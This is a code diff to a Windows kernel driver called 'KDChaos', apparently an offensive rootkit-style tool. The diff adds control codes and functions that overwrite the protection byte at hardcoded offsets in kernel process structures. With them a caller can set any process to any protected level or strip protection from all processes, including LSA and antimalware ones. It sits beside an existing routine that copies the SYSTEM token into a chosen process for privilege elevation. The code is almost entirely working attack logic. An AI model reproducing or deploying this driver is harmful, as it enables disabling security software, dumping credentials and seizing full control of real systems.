@@ -8,6 +8,27 @@
 
 #define PRIVILEGE_ELEVATION CTL_CODE(FILE_DEVICE_UNKNOWN,0x90,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 
+#define PROTECTION_LEVEL_SYSTEM CTL_CODE(FILE_DEVICE_UNKNOWN,0x91,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+#define PROTECTION_LEVEL_WINTCB CTL_CODE(FILE_DEVICE_UNKNOWN,0x92,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+#define PROTECTION_LEVEL_WINDOWS CTL_CODE(FILE_DEVICE_UNKNOWN,0x93,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+#define PROTECTION_LEVEL_AUTHENTICODE CTL_CODE(FILE_DEVICE_UNKNOWN,0x94,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+#define PROTECTION_LEVEL_WINTCB_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x95,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+#define PROTECTION_LEVEL_WINDOWS_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x96,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+#define PROTECTION_LEVEL_LSA_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x97,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x98,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x99,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+#define UNPROTECT_ALL_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN,0x100,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+
 UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KDChaos");
 
 UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");
@@ -15,6 +36,113 @@ UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");
 char* PsGetProcessImageFileName(PEPROCESS Process);
 
 EX_PUSH_LOCK pLock;
+
+
+typedef struct protection_levels {
+    BYTE PS_PROTECTED_SYSTEM;
+    BYTE PS_PROTECTED_WINTCB;
+    BYTE PS_PROTECTED_WINDOWS;
+    BYTE PS_PROTECTED_AUTHENTICODE;
+    BYTE PS_PROTECTED_WINTCB_LIGHT;
+    BYTE PS_PROTECTED_WINDOWS_LIGHT;
+    BYTE PS_PROTECTED_LSA_LIGHT;
+    BYTE PS_PROTECTED_ANTIMALWARE_LIGHT;
+    BYTE PS_PROTECTED_AUTHENTICODE_LIGHT;
+}protection_level, *Pprotection_levels;
+
+protection_level global_protection_levels = {
+    .PS_PROTECTED_SYSTEM = 0x72,
+    .PS_PROTECTED_WINTCB = 0x62,
+    .PS_PROTECTED_WINDOWS = 0x52,
+    .PS_PROTECTED_AUTHENTICODE = 0x12,
+    .PS_PROTECTED_WINTCB_LIGHT = 0x61,
+    .PS_PROTECTED_WINDOWS_LIGHT = 0x51,
+    .PS_PROTECTED_LSA_LIGHT = 0x41,
+    .PS_PROTECTED_ANTIMALWARE_LIGHT = 0x31,
+    .PS_PROTECTED_AUTHENTICODE_LIGHT = 0x11
+};
+
+int
+UnprotectAllProcesses(
+)
+{
+    PVOID process = NULL;
+    PLIST_ENTRY plist;
+    __try
+    {
+
+        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);
+        if (ret != STATUS_SUCCESS)
+        {
+            if (ret == STATUS_INVALID_PARAMETER)
+            {
+                DbgPrint("the process ID was not found.");
+            }
+            if (ret == STATUS_INVALID_CID)
+            {
+                DbgPrint("the specified client ID is not valid.");
+            }
+            return (-1);
+        }
+
+        plist = (PLIST_ENTRY)((char*)process + 0x448);
+
+        while (plist->Flink != (PLIST_ENTRY)((char*)process + 0x448))
+        {
+            DbgPrint("Blink: %p, Flink: %p\n", plist->Blink, plist->Flink);
+
+            ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink - 0x448 + 0x87a;
+
+            *(BYTE*)EProtectionLevel = (BYTE)0;
+
+            plist = plist->Flink;
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        return (-1);
+    }
+
+    ObDereferenceObject(process);
+    return (0);
+}
+
+int ChangeProtectionLevel(int pid,BYTE protectionOption)
+{
+    PVOID process = NULL;
+
+    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, &process);
+
+    if (ret != STATUS_SUCCESS)
+    {
+        if (ret == STATUS_INVALID_PARAMETER)
+        {
+            DbgPrint("the process ID was not found.");
+        }
+        if (ret == STATUS_INVALID_CID)
+        {
+            DbgPrint("the specified client ID is not valid.");
+        }
+        return (-1);
+    }
+
+    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + 0x87a;
+
+    if (*(BYTE*)EProtectionLevel == protectionOption)
+    {
+        DbgPrint("Protection Level is already set !!");
+
+        return (0);
+    }
+
+    *(BYTE*)EProtectionLevel = protectionOption;
+
+    return (0);
+
+
+    return (0);
+}
+
 
 int
 PrivilegeElevationForProcess(
@@ -101,7 +229,6 @@ PrivilegeElevationForProcess(
 
         DbgPrint("system token address : %x\n", sysadd);
 
-        unsigned long long  usysid = *(PHANDLE)sysadd;
 
         *(PHANDLE)UniqueProcessIdAddress = *(PHANDLE)sysadd;
 
@@ -227,13 +354,90 @@ NTSTATUS processIoctlRequest(
 
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PRIVILEGE_ELEVATION)
     {
-    
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
 
         pstatus = PrivilegeElevationForProcess(inputInt);
 
         DbgPrint("Received input value: %d\n", inputInt);
     }
+    if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_SYSTEM)
+     {
+        RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+        pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_SYSTEM);
+
+        DbgPrint("Process Protection changed to WinSystem");
+     }
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_WINTCB)
+     {
+         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINTCB);
+
+         DbgPrint("Process Protection changed to WinTcb");
+     }
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_WINDOWS)
+     {
+         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINDOWS);
+
+         DbgPrint("Process Protection changed to Windows");
+     }
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_AUTHENTICODE)
+     {
+         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_AUTHENTICODE);
+
+         DbgPrint("Process Protection changed to Authenticode ");
+     }
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_WINTCB_LIGHT)
+     {
+         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINTCB_LIGHT);
+
+         DbgPrint("Process Protection changed to WinTcb ");
+     }
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_WINDOWS_LIGHT)
+     {
+         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINDOWS_LIGHT);
+
+         DbgPrint("Process Protection changed to Windows ");
+     }
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_LSA_LIGHT)
+     {
+         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_LSA_LIGHT);
+
+         DbgPrint("Process Protection changed to Lsa");
+     }
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_ANTIMALWARE_LIGHT)
+     {
+         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT);
+
+         DbgPrint("Process Protection changed to Antimalware ");
+     }
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == PROTECTION_LEVEL_AUTHENTICODE_LIGHT)
+     {
+         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+         pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_AUTHENTICODE_LIGHT);
+
+         DbgPrint("Process Protection changed to Authenticode ");
+     }
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == UNPROTECT_ALL_PROCESSES)
+     {
+         pstatus = UnprotectAllProcesses();
+
+         DbgPrint("all Processes Protection has been removed");
+     }
     memcpy(Irp->AssociatedIrp.SystemBuffer, &pstatus, sizeof(pstatus));
 
     Irp->IoStatus.Status = 0;
@@ -263,6 +467,7 @@ DriverEntry(
 {
     DbgPrint("Driver Loaded\n");
     ExInitializePushLock(&pLock);
+
     UNREFERENCED_PARAMETER(registryPath);
     UNREFERENCED_PARAMETER(driverObject);
 
